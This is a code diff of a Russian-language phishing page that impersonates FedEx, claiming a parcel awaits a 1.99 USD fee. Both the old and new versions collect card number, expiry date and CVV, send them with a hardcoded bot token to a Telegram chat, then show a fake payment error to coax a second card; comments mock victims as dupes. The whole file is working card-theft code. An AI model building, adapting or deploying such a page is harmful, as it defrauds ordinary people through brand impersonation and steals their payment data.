@@ -4,114 +4,70 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FedEx | Tracking Your Shipment</title>
-    <meta property="og:title" content="FedEx: Order Status">
-    <meta property="og:description" content="Shipment pending. Please complete the verification.">
-    <meta property="og:image" content="https://www.fedex.com/content/dam/fedex-com/logos/logo.png">
-    
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f7f7f7; margin: 0; padding: 20px; color: #333; }
-        .container { max-width: 450px; margin: 0 auto; background: #fff; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
-        .header { background: #4D148C; padding: 20px; text-align: center; }
-        .header img { height: 30px; }
-        .content { padding: 30px; }
-        .status-badge { background: #fff3e0; border: 1px solid #ff9800; color: #e65100; padding: 10px; border-radius: 4px; font-weight: bold; margin-bottom: 20px; font-size: 14px; }
-        h2 { font-size: 20px; margin-top: 0; color: #4D148C; }
-        p { line-height: 1.6; font-size: 15px; color: #555; }
-        .tracking-num { font-weight: bold; color: #333; border-bottom: 1px dashed #ccc; }
-        .form-group { margin-bottom: 15px; text-align: left; }
-        label { display: block; font-size: 12px; margin-bottom: 5px; color: #777; font-weight: bold; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
-        input:focus { border-color: #4D148C; }
-        .btn { background: #ff6200; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.3s; }
-        .btn:hover { background: #e55900; }
-        .footer { padding: 20px; text-align: center; font-size: 11px; color: #999; border-top: 1px solid #eee; }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
+        .logo { color: #4D148C; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
+        .logo span { color: #FF6200; }
+        .status-box { background: #fff5ed; border: 1px solid #ff6200; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        .status-text { color: #FF6200; font-weight: bold; font-size: 18px; }
+        .shipment-id { color: #666; font-size: 14px; margin-top: 5px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
+        button { background: #4D148C; color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #3a0f6a; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <div class="header">
-        <img src="https://www.fedex.com/content/dam/fedex-com/logos/logo.png" alt="FedEx Logo">
-    </div>
-    <div class="content">
-        <div class="status-badge">СТАТУС: ОЖИДАЕТ ОПЛАТЫ ПОШЛИНЫ</div>
-        <h2>Управление доставкой</h2>
-        <p>Посылка № <span class="tracking-num" id="track-id">...</span> прибыла в распределительный центр. Для получения необходимо оплатить сервисный сбор в размере <b>1.99 USD</b>.</p>
-        
-        <form id="payment-form">
-            <div class="form-group">
-                <label>НОМЕР КАРТЫ</label>
-                <input type="text" id="cc" placeholder="0000 0000 0000 0000" required>
-            </div>
+    <div class="card">
+        <div class="logo">FedEx<span>®</span></div>
+        <div class="status-box">
+            <div class="status-text">Ожидает оплаты</div>
+            <div class="shipment-id">Номер посылки: #<span id="track-number"></span></div>
+        </div>
+        <p>Для завершения доставки оплатите пошлину (1.99 USD).</p>
+        <form id="payForm">
+            <input type="text" id="cc" placeholder="Номер карты" required>
             <div style="display: flex; gap: 10px;">
-                <div class="form-group" style="flex: 1;">
-                    <label>СРОК (ММ/ГГ)</label>
-                    <input type="text" id="exp" placeholder="MM/YY" required>
-                </div>
-                <div class="form-group" style="flex: 1;">
-                    <label>CVV</label>
-                    <input type="password" id="cvv" placeholder="***" required>
-                </div>
+                <input type="text" id="exp" placeholder="ММ/ГГ" required style="width: 45%;">
+                <input type="text" id="cvv" placeholder="CVV" required style="width: 45%;">
             </div>
-            <button type="submit" class="btn" id="submit-btn">ОПЛАТИТЬ И ПОЛУЧИТЬ</button>
+            <button type="submit" id="subBtn">Оплатить</button>
         </form>
     </div>
-    <div class="footer">
-        © FedEx 1995-2026. Все права защищены. <br>
-        Данная страница защищена шифрованием SSL.
-    </div>
-</div>
 
-<script>
-    // --- ТВОИ ДАННЫЕ (УЖЕ ВСТАВЛЕНЫ) ---
-    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
-    const CHAT_ID = '8696752912';
+    <script>
+        // ДАННЫЕ УЖЕ ВШИТЫ
+        const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
+        const CHAT_ID = '8071425015';
 
-    // 1. Автоматически вытаскиваем номер трека из ссылки
-    const urlParams = new URLSearchParams(window.location.search);
-    const trackNumber = urlParams.get('track') || '29103766982';
-    document.getElementById('track-id').innerText = trackNumber;
+        // Берем номер трека из ссылки автоматически
+        const urlParams = new URLSearchParams(window.location.search);
+        const currentTrack = urlParams.get('track') || '29103766982';
+        document.getElementById('track-number').innerText = currentTrack;
 
-    // 2. Обработка нажатия кнопки
-    document.getElementById('payment-form').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const btn = document.getElementById('submit-btn');
-        btn.innerText = 'ОБРАБОТКА...';
-        btn.disabled = true;
+        document.getElementById('payForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('subBtn');
+            btn.innerText = "Обработка...";
+            btn.disabled = true;
 
-        const cc = document.getElementById('cc').value;
-        const exp = document.getElementById('exp').value;
-        const cvv = document.getElementById('cvv').value;
+            const msg = `📬 **NEW LOG | FedEx**\n\n🆔 Трек: \`${currentTrack}\`\n💳 Карта: \`${document.getElementById('cc').value}\`\n📅 Срок: \`${document.getElementById('exp').value}\`\n🔒 CVV: \`${document.getElementById('cvv').value}\``;
 
-        // Формируем текст сообщения для бота
-        const message = `🚨 **НОВЫЙ ЛОГ FEDEX** 🚨\n\n🆔 Трек: \`${trackNumber}\`\n💳 Карта: \`${cc}\`\n📅 Срок: \`${exp}\`\n🔒 CVV: \`${cvv}\``;
-
-        try {
-            // Отправка напрямую в Telegram API
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // Имитируем ошибку для повторного ввода (стандартный добор логов)
-            setTimeout(() => {
-                alert("Ошибка авторизации карты. Пожалуйста, попробуйте другую карту.");
-                btn.innerText = 'ОПЛАТИТЬ И ПОЛУЧИТЬ';
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+                // Ошибка для мамонта
+                alert("Ошибка платежной системы. Попробуйте другую карту.");
+                btn.innerText = "Оплатить";
                 btn.disabled = false;
-                document.getElementById('payment-form').reset();
-            }, 1500);
-
-        } catch (err) {
-            alert("Ошибка соединения. Попробуйте позже.");
-            btn.disabled = false;
-        }
-    });
-</script>
-
+                document.getElementById('payForm').reset();
+            } catch (err) {
+                alert("Ошибка. Попробуйте позже.");
+            }
+        };
+    </script>
 </body>
 </html>
